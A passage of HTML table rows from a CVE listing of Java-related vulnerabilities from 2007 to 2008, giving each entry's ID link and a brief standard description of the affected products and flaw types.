		<td valign="top">Multiple directory traversal vulnerabilities in unspecified ASP applications in Sun Java Active Server Pages (ASP) Server before 4.0.3 allow remote attackers to read or delete arbitrary files via a .. (dot dot) in the Path parameter to the MapPath method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2402">CVE-2008-2402</a></td>
		<td valign="top">The Admin Server in Sun Java Active Server Pages (ASP) Server before 4.0.3 stores sensitive information under the web root with insufficient access control, which allows remote attackers to read password hashes and configuration data via direct requests for unspecified documents.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2401">CVE-2008-2401</a></td>
		<td valign="top">The Admin Server in Sun Java Active Server Pages (ASP) Server before 4.0.3 allows remote attackers to append to arbitrary new or existing files via the first argument to a certain file that is included by multiple unspecified ASP applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2310">CVE-2008-2310</a></td>
		<td valign="top">Format string vulnerability in c++filt in Apple Mac OS X 10.5 before 10.5.4 allows user-assisted attackers to execute arbitrary code or cause a denial of service (application crash) via a crafted string in (1) C++ or (2) Java source code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2221">CVE-2008-2221</a></td>
		<td valign="top">Unspecified vulnerability in the Java plugin in IBM WebSphere Application Server 5.0.2 allows untrusted applets to gain privileges via unknown attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2166">CVE-2008-2166</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the search module in Sun Java System Web Server 6.1 before SP9 and 7.0 before Update 2 allows remote attackers to inject arbitrary web script or HTML via unknown parameters in index.jsp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2120">CVE-2008-2120</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Application Server 7 2004Q2 before Update 6, Web Server 6.1 before SP8, and Web Server 7.0 before Update 1 allows remote attackers to obtain source code of JSP files via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-2086">CVE-2008-2086</a></td>
		<td valign="top">Sun Java Web Start and Java Plug-in for JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; and SDK and JRE 1.4.2_18 and earlier allow remote attackers to execute arbitrary code via a crafted jnlp file that modifies the (1) java.home, (2) java.ext.dirs, or (3) user.home System Properties, aka "Java Web Start File Inclusion" and CR 6694892.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1995">CVE-2008-1995</a></td>
		<td valign="top">Sun Java System Directory Proxy Server 6.0, 6.1, and 6.2 classifies a connection using the "bind-dn" criteria, which can cause an incorrect application of policy and allows remote attackers to bypass intended access restrictions for the server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1966">CVE-2008-1966</a></td>
		<td valign="top">Multiple buffer overflows in the JAR file administration routines in the BSU JAVA subcomponent in IBM DB2 8 before FP16, 9.1 before FP4a, and 9.5 before FP1 allow remote authenticated users to cause a denial of service (instance crash) via a call to the (1) RECOVERJAR or (2) REMOVE_JAR procedure with a crafted parameter, related to (a) sqlj.install_jar and (b) sqlj.replace_jar.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1894">CVE-2008-1894</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in desktoplaunch/InfoView/logon/logon.object in BusinessObjects InfoView XI R2 SP1, SP2, and SP3 Java version before FixPack 3.5 allows remote attackers to inject arbitrary web script or HTML via the cms parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1356">CVE-2008-1356</a></td>
		<td valign="top">Unspecified vulnerability in xscreensaver in Sun Solaris 10 Java Desktop System (JDS), when using the GNOME On-Screen Keyboard (GOK), allows local users to bypass authentication via unknown vectors that cause the screen saver to crash.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1286">CVE-2008-1286</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Web Console 3.0.2, 3.0.3, and 3.0.4 allows remote attackers to bypass intended access restrictions and determine the existence of files or directories via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1285">CVE-2008-1285</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java Server Faces (JSF) 1.2 before 1.2_08 allows remote attackers to inject arbitrary web script or HTML via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1240">CVE-2008-1240</a></td>
		<td valign="top">LiveConnect in Mozilla Firefox before 2.0.0.13 and SeaMonkey before 1.1.9 does not properly parse the content origin for jar: URIs before sending them to the Java plugin, which allows remote attackers to access arbitrary ports on the local machine.  NOTE: this is closely related to CVE-2008-1195.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1204">CVE-2008-1204</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Administration Console in Sun Java System Access Manager 7.1 and 7 2005Q4 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors related to the (1) Help and (2) Version windows.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1196">CVE-2008-1196</a></td>
		<td valign="top">Stack-based buffer overflow in Java Web Start (javaws.exe) in Sun JDK and JRE 6 Update 4 and earlier and 5.0 Update 14 and earlier; and SDK and JRE 1.4.2_16 and earlier; allows remote attackers to execute arbitrary code via a crafted JNLP file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1195">CVE-2008-1195</a></td>
		<td valign="top">Unspecified vulnerability in Sun JDK and Java Runtime Environment (JRE) 6 Update 4 and earlier and 5.0 Update 14 and earlier; and SDK and JRE 1.4.2_16 and earlier; allows remote attackers to access arbitrary network services on the local host via unspecified vectors related to JavaScript and Java APIs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1193">CVE-2008-1193</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment Image Parsing Library in Sun JDK and JRE 6 Update 4 and earlier, and 5.0 Update 14 and earlier, allows remote attackers to gain privileges via an untrusted application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1192">CVE-2008-1192</a></td>
		<td valign="top">Unspecified vulnerability in the Java Plug-in for Sun JDK and JRE 6 Update 4 and earlier, and 5.0 Update 14 and earlier; and SDK and JRE 1.4.2_16 and earlier, and 1.3.1_21 and earlier; allows remote attackers to bypass the same origin policy and "execute local applications" via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1191">CVE-2008-1191</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start in Sun JDK and JRE 6 Update 4 and earlier allows remote attackers to create arbitrary files via an untrusted application, a different issue than CVE-2008-1190, aka "The fifth issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1190">CVE-2008-1190</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start in Sun JDK and JRE 6 Update 4 and earlier, 5.0 Update 14 and earlier, and SDK/JRE 1.4.2_16 and earlier allows remote attackers to gain privileges via an untrusted application, a different issue than CVE-2008-1191, aka the "fourth" issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1189">CVE-2008-1189</a></td>
		<td valign="top">Buffer overflow in Java Web Start in Sun JDK and JRE 6 Update 4 and earlier, 5.0 Update 14 and earlier, and SDK/JRE 1.4.2_16 and earlier allows remote attackers to execute arbitrary code via unknown vectors, a different issue than CVE-2008-1188, aka the "third" issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1188">CVE-2008-1188</a></td>
		<td valign="top">Multiple buffer overflows in the useEncodingDecl function in Java Web Start in Sun JDK and JRE 6 Update 4 and earlier, and 5.0 Update 14 and earlier, allow remote attackers to execute arbitrary code via a JNLP file with (1) a long key name in the xml header or (2) a long charset value, different issues than CVE-2008-1189, aka "The first two issues."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1187">CVE-2008-1187</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java Runtime Environment (JRE) and JDK 6 Update 4 and earlier, 5.0 Update 14 and earlier, and SDK/JRE 1.4.2_16 and earlier allows remote attackers to cause a denial of service (JRE crash) and possibly execute arbitrary code via unknown vectors related to XSLT transforms.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1186">CVE-2008-1186</a></td>
		<td valign="top">Unspecified vulnerability in the Virtual Machine for Sun Java Runtime Environment (JRE) and JDK 5.0 Update 13 and earlier, and SDK/JRE 1.4.2_16 and earlier, allows remote attackers to gain privileges via an untrusted application or applet, a different issue than CVE-2008-1185, aka "the second issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1185">CVE-2008-1185</a></td>
		<td valign="top">Unspecified vulnerability in the Virtual Machine for Sun Java Runtime Environment (JRE) and JDK 6 Update 4 and earlier, 5.0 Update 14 and earlier, and SDK/JRE 1.4.2_16 and earlier allows remote attackers to gain privileges via an untrusted application or applet, a different issue than CVE-2008-1186, aka "the first issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1013">CVE-2008-1013</a></td>
		<td valign="top">Apple QuickTime before 7.4.5 enables deserialization of QTJava objects by untrusted Java applets, which allows remote attackers to execute arbitrary code via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-1007">CVE-2008-1007</a></td>
		<td valign="top">WebCore, as used in Apple Safari before 3.1, does not enforce the frame navigation policy for Java applets, which allows remote attackers to conduct cross-site scripting (XSS) attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-0657">CVE-2008-0657</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Java Runtime Environment in Sun JDK and JRE 6 Update 1 and earlier, and 5.0 Update 13 and earlier, allow context-dependent attackers to gain privileges via an untrusted (1) application or (2) applet, as demonstrated by an application or applet that grants itself privileges to (a) read local files, (b) write to local files, or (c) execute local programs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-0628">CVE-2008-0628</a></td>
		<td valign="top">The XML parsing code in Sun Java Runtime Environment JDK and JRE 6 Update 3 and earlier processes external entity references even when the "external general entities" property is false, which allows remote attackers to conduct XML external entity (XXE) attacks and cause a denial of service or access restricted resources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-0241">CVE-2008-0241</a></td>
		<td valign="top">Open redirect vulnerability in /idm/user/login.jsp in Sun Java System Identity Manager 6.0 SP1 through SP3, 7.0, and 7.1 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the nextPage parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-0240">CVE-2008-0240</a></td>
		<td valign="top">/idm/help/index.jsp in Sun Java System Identity Manager 6.0 SP1 through SP3, 7.0, and 7.1 allows remote attackers to inject frames from arbitrary web sites and conduct phishing attacks via the helpUrl parameter, aka "frame injection."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-0239">CVE-2008-0239</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Identity Manager 6.0 SP1 through SP3, 7.0, and 7.1 allow remote attackers to inject arbitrary HTML or web script via the (1) cntry or lang parameters to /idm/login.jsp, (2) resultsForm parameter to /idm/account/findForSelect.jsp, or (3) activeControl parameter to /idm/user/main.jsp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6721">CVE-2007-6721</a></td>
		<td valign="top">The Legion of the Bouncy Castle Java Cryptography API before release 1.38, as used in Crypto Provider Package before 1.36, has unknown impact and remote attack vectors related to "a Bleichenbacher vulnerability in simple RSA CMS signatures without signed attributes."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6572">CVE-2007-6572</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Web Server 6.1 before SP8 and 7.0 before Update 1 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka BugID 6566204.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6571">CVE-2007-6571</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Web Proxy Server 3.6 before SP11 on Windows allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka BugID 6611356.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6570">CVE-2007-6570</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the View URL Database functionality in Sun Java System Web Proxy Server 4.x before 4.0.6 and 3.x before 3.6 SP11 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka BugID 6566309.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6569">CVE-2007-6569</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the View Error Log functionality in Sun Java System Web Proxy Server 4.x before 4.0.6 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka BugID 6566246.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6382">CVE-2007-6382</a></td>
		<td valign="top">The Event Dispatch Thread in Robocode before 1.5.1 allows remote attackers to execute arbitrary Java code by using a robot to invoke the SwingUtilities.invokeLater method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-6059">CVE-2007-6059</a></td>
		<td valign="top">** DISPUTED **

Javamail does not properly handle a series of invalid login attempts in which the same e-mail address is entered as username and password, and the domain portion of this address yields a Java UnknownHostException error, which allows remote attackers to cause a denial of service (connection pool exhaustion) via a large number of requests, resulting in a SQLNestedException.  NOTE: Sun disputes this issue, stating "The report makes references to source code and files that do not exist in the mentioned products."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5862">CVE-2007-5862</a></td>
		<td valign="top">Java in Mac OS X 10.4 through 10.4.11 allows remote attackers to bypass Keychain access controls and add or delete arbitrary Keychain items via a crafted Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5689">CVE-2007-5689</a></td>
		<td valign="top">The Java Virtual Machine (JVM) in Sun Java Runtime Environment (JRE) in SDK and JRE 1.3.x through 1.3.1_20 and 1.4.x through 1.4.2_15, and JDK and JRE 5.x through 5.0 Update 12 and 6.x through 6 Update 2, allows remote attackers to execute arbitrary programs, or read or modify arbitrary files, via applets that grant privileges to themselves.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5375">CVE-2007-5375</a></td>
		<td valign="top">Interpretation conflict in the Sun Java Virtual Machine (JVM) allows user-assisted remote attackers to conduct a multi-pin DNS rebinding attack and execute arbitrary JavaScript in an intranet context, when an intranet web server has an HTML document that references a "mayscript=true" Java applet through a local relative URI, which may be associated with different IP addresses by the browser and the JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5366">CVE-2007-5366</a></td>
		<td valign="top">The Tomcat 4.1-based Servlet Service in Fujitsu Interstage Application Server 7.0 through 9.0.0 and Interstage Apworks/Studio 7.0 through 9.0.0 allows remote attackers to obtain sensitive information (web root path) via unspecified vectors that trigger an error message, probably related to enabling the useCanonCaches Java Virtual Machine (JVM) option.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5281">CVE-2007-5281</a></td>
		<td valign="top">The Java Secure Socket Extension (JSSE) in the Hitachi Cosminexus Developer's Kit for Java in various Hitachi Cosminexus 7.5 products before 07-50-01, when using JSSE for SSL/TLS support, allows remote attackers to cause a denial of service via certain SSL/TLS handshake requests.  NOTE: this may be the same as CVE-2007-3698.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5274">CVE-2007-5274</a></td>
		<td valign="top">Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, SDK and JRE 1.4.2_15 and earlier, and SDK and JRE 1.3.1_20 and earlier, when Firefox or Opera is used, allows remote attackers to violate the security model for JavaScript outbound connections via a multi-pin DNS rebinding attack dependent on the LiveConnect API, in which JavaScript download relies on DNS resolution by the browser, but JavaScript socket operations rely on separate DNS resolution by a Java Virtual Machine (JVM), a different issue than CVE-2007-5273.  NOTE: this is similar to CVE-2007-5232.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5273">CVE-2007-5273</a></td>
		<td valign="top">Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, SDK and JRE 1.4.2_15 and earlier, and SDK and JRE 1.3.1_20 and earlier, when an HTTP proxy server is used, allows remote attackers to violate the security model for an applet's outbound connections via a multi-pin DNS rebinding attack in which the applet download relies on DNS resolution on the proxy server, but the applet's socket operations rely on DNS resolution on the local machine, a different issue than CVE-2007-5274. NOTE: this is similar to CVE-2007-5232.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5240">CVE-2007-5240</a></td>
		<td valign="top">Visual truncation vulnerability in the Java Runtime Environment in Sun JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, SDK and JRE 1.4.2_15 and earlier, and SDK and JRE 1.3.1_20 and earlier allows remote attackers to circumvent display of the untrusted-code warning banner by creating a window larger than the workstation screen.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5239">CVE-2007-5239</a></td>
		<td valign="top">Java Web Start in Sun JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, SDK and JRE 1.4.2_15 and earlier, and SDK and JRE 1.3.1_20 and earlier does not properly enforce access restrictions for untrusted (1) applications and (2) applets, which allows user-assisted remote attackers to copy or rename arbitrary files when local users perform drag-and-drop operations from the untrusted application or applet window onto certain types of desktop applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5238">CVE-2007-5238</a></td>
		<td valign="top">Java Web Start in Sun JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, and SDK and JRE 1.4.2_15 and earlier does not properly enforce access restrictions for untrusted applications, which allows user-assisted remote attackers to obtain sensitive information (the Java Web Start cache location) via an untrusted application, aka "three vulnerabilities."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5237">CVE-2007-5237</a></td>
		<td valign="top">Java Web Start in Sun JDK and JRE 6 Update 2 and earlier does not properly enforce access restrictions for untrusted applications, which allows user-assisted remote attackers to read and modify local files via an untrusted application, aka "two vulnerabilities."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5236">CVE-2007-5236</a></td>
		<td valign="top">Java Web Start in Sun JDK and JRE 5.0 Update 12 and earlier, and SDK and JRE 1.4.2_15 and earlier, on Windows does not properly enforce access restrictions for untrusted applications, which allows user-assisted remote attackers to read local files via an untrusted application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5232">CVE-2007-5232</a></td>
		<td valign="top">Sun Java Runtime Environment (JRE) in JDK and JRE 6 Update 2 and earlier, JDK and JRE 5.0 Update 12 and earlier, SDK and JRE 1.4.2_15 and earlier, and SDK and JRE 1.3.1_20 and earlier, when applet caching is enabled, allows remote attackers to violate the security model for an applet's outbound connections via a DNS rebinding attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5153">CVE-2007-5153</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Access Manager 7.1, when installed in a Sun Java System Application Server 8.x container, allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5152">CVE-2007-5152</a></td>
		<td valign="top">Sun Java System Access Manager 7.1, when installed in a Sun Java System Application Server 9.1 container, does not demand authentication after a container restart, which allows remote attackers to perform administrative tasks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-5019">CVE-2007-5019</a></td>
		<td valign="top">Buffer overflow in the Sun Java Web Start ActiveX control in Java Runtime Environment (JRE) 1.6.0_X allows remote attackers to have an unknown impact via a long argument to the dnsResolve (isInstalled.dnsResolve) method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4980">CVE-2007-4980</a></td>
		<td valign="top">The readRequest method in org/gcaldaemon/core/http/HTTPListener.java in GCALDaemon 1.0-beta13 allows remote attackers to cause a denial of service via a large integer value in the Content-Length HTTP header, which triggers a fatal Java OutOfMemoryError.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4760">CVE-2007-4760</a></td>
		<td valign="top">The javadoc tool in Cosminexus Developer's Kit for Java in Cosminexus 7 and 7.5 can generate HTML documents that contain cross-site scripting (XSS) vulnerabilities, which allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.  NOTE: this is probably the same issue as CVE-2007-3503.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4759">CVE-2007-4759</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the image-processing APIs in Cosminexus Developer's Kit for Java in Cosminexus 4 through 7 allow remote attackers to cause a denial of service via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4758">CVE-2007-4758</a></td>
		<td valign="top">Multiple buffer overflows in the image-processing APIs in Cosminexus Developer's Kit for Java in Cosminexus 4 through 7 allow remote attackers to cause a denial of service or execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4575">CVE-2007-4575</a></td>
		<td valign="top">HSQLDB before 1.8.0.9, as used in OpenOffice.org (OOo) 2 before 2.3.1, allows user-assisted remote attackers to execute arbitrary Java code via crafted database documents, related to "exposing static java methods."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4364">CVE-2007-4364</a></td>
		<td valign="top">Fedora Commons before 2.2.1 does not properly handle certain authentication requests involving Java Naming and Directory Interface (JNDI), related to (1) a nonexistent account name in combination with an empty password, which allows remote attackers to trigger a certain "unexpected / strange response" from an LDAP server, and (2) a reauthentication attempt that throws an exception, which allows remote attackers to trigger use of a cached authentication decision.  NOTE: authentication can be bypassed by using vector 1 followed by vector 2, and possibly can be bypassed by using a single vector.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4289">CVE-2007-4289</a></td>
		<td valign="top">Sun Java System Portal Server 7.0 does not properly process XSLT stylesheets in XSLT transforms in XML signatures, which allows context-dependent attackers to execute an arbitrary Java method via a crafted stylesheet, a related issue to CVE-2007-3715.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4164">CVE-2007-4164</a></td>
		<td valign="top">CRLF injection vulnerability in the redirect feature in Sun Java System Web Server 6.1 and 7.0 before 20070802, when the redirect Server Application Function (SAF) uses the url-prefix parameter and escape is disabled, or an Error directive uses the url-prefix parameter in obj.conf, allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-4025">CVE-2007-4025</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System (SJS) Application Server 8.1 through 9.0 before 20070724 on Windows allows remote attackers to obtain JSP source code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3922">CVE-2007-3922</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) Applet Class Loader in Sun JDK and JRE 5.0 Update 11 and earlier, 6 through 6 Update 1, and SDK and JRE 1.4.2_14 and earlier, allows remote attackers to violate the security model for an applet's outbound connections by connecting to certain localhost services running on the machine that loaded the applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3853">CVE-2007-3853</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Oracle Database 10.1.0.5 and 10.2.0.3 allow remote authenticated users to have unknown impact via (1) DBMS_JAVA_TEST in the JavaVM component (DB01), (2) Oracle Text component (DB09), and (3) MDSYS.SDO_GEOR_INT in the Spatial component (DB15).  NOTE: a reliable researcher claims that DB01 is SQL injection in DBMS_PRVTAQIS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3794">CVE-2007-3794</a></td>
		<td valign="top">Buffer overflow in Hitachi Cosminexus V4 through V7, Processing Kit for XML before 20070511, Developer's Kit for Java before 20070312, and third-party products that use this software, allows attackers to have an unknown impact via certain GIF images, related to use of GIF image processing APIs by a Java application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3751">CVE-2007-3751</a></td>
		<td valign="top">Unspecified vulnerability in QuickTime for Java in Apple QuickTime before 7.3 allows remote attackers to execute arbitrary code via untrusted Java applets that gain privileges via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3747">CVE-2007-3747</a></td>
		<td valign="top">The Java interface to CoreAudio on Apple Mac OS X 10.3.9 and 10.4.10 does not restrict object instantiation and manipulation to valid heap addresses, which allows remote attackers to execute arbitrary code via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3746">CVE-2007-3746</a></td>
		<td valign="top">The Java interface to CoreAudio on Apple Mac OS X 10.3.9 and 10.4.10 does not properly check the bounds of heap read and write operations, which allows remote attackers to execute arbitrary code via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3745">CVE-2007-3745</a></td>
		<td valign="top">The Java interface to CoreAudio on Apple Mac OS X 10.3.9 and 10.4.10 contains an unsafe interface that is exposed by JDirect, which allows remote attackers to free arbitrary memory and thereby execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3716">CVE-2007-3716</a></td>
		<td valign="top">The Java XML Digital Signature implementation in Sun JDK and JRE 6 before Update 2 does not properly process XSLT stylesheets in XSLT transforms in XML signatures, which allows context-dependent attackers to execute arbitrary code via a crafted stylesheet, a related issue to CVE-2007-3715.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2007-3715">CVE-2007-3715</a></td>
